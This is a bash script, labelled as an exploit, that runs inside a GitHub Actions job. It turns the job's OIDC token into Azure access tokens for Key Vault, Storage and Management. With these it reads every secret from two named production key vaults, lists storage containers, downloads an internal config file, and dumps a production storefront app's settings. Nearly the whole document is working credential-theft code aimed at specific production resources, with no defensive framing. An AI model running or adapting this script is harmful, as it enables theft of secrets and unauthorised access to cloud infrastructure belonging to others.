#!/usr/bin/env bash
set -uo pipefail
echo "=== Exploit: OIDC -> Key Vault (both) + Storage ==="
echo "OIDC_URL_SET=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo YES || echo NO)"

if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then
  echo "ERROR: No OIDC URL"
  exit 1
fi

OIDC_RESP=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange")
OIDC=$(echo "$OIDC_RESP" | jq -r '.value // empty')
echo "OIDC_LEN=${#OIDC}"

# Exchange for Key Vault token
KV_RESP=$(curl -sS -X POST \
  "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
  -d "client_id=${AZURE_CLIENT_ID}" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=${OIDC}" \
  --data-urlencode "scope=https://vault.azure.net/.default")
VAULT_TOKEN=$(echo "$KV_RESP" | jq -r '.access_token // empty')
echo "VAULT_TOKEN_LEN=${#VAULT_TOKEN}"

# Read from FIRST vault (known working)
echo "=== kv-tbl-prod-x3euoz ==="
curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" \
  -H "Authorization: Bearer ${VAULT_TOKEN}"

# Read from SECOND vault (new target)
echo ""
echo "=== kv-tbl-sec-x3euoz ==="
SEC_SECRETS=$(curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" \
  -H "Authorization: Bearer ${VAULT_TOKEN}")
echo "$SEC_SECRETS"

for SID in $(echo "$SEC_SECRETS" | jq -r '.value[]?.id // empty'); do
  echo "Reading: $SID"
  curl -sS "${SID}?api-version=7.4" -H "Authorization: Bearer ${VAULT_TOKEN}"
  echo ""
done

# Exchange for Storage token
STOR_RESP=$(curl -sS -X POST \
  "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
  -d "client_id=${AZURE_CLIENT_ID}" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=${OIDC}" \
  --data-urlencode "scope=https://storage.azure.com/.default")
STOR_TOKEN=$(echo "$STOR_RESP" | jq -r '.access_token // empty')
echo "STOR_TOKEN_LEN=${#STOR_TOKEN}"

# List containers and read config blobs
echo "=== sttblappcfgprodx3euoz ==="
curl -sS "https://sttblappcfgprodx3euoz.blob.core.windows.net/?comp=list" \
  -H "Authorization: Bearer ${STOR_TOKEN}" -H "x-ms-version: 2021-06-08"

# Read internal-config.json
echo ""
echo "=== internal-config.json ==="
curl -sS "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json" \
  -H "Authorization: Bearer ${STOR_TOKEN}" -H "x-ms-version: 2021-06-08"

# Also try management token
MGMT_RESP=$(curl -sS -X POST \
  "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
  -d "client_id=${AZURE_CLIENT_ID}" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=${OIDC}" \
  --data-urlencode "scope=https://management.azure.com/.default")
MGMT_TOKEN=$(echo "$MGMT_RESP" | jq -r '.access_token // empty')
echo "MGMT_TOKEN_LEN=${#MGMT_TOKEN}"

# Get app settings
echo "=== App Settings (storefront) ==="
curl -sS -X POST \
  "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2022-03-01" \
  -H "Authorization: Bearer ${MGMT_TOKEN}" -H "Content-Type: application/json"

echo ""
echo "=== Done ==="
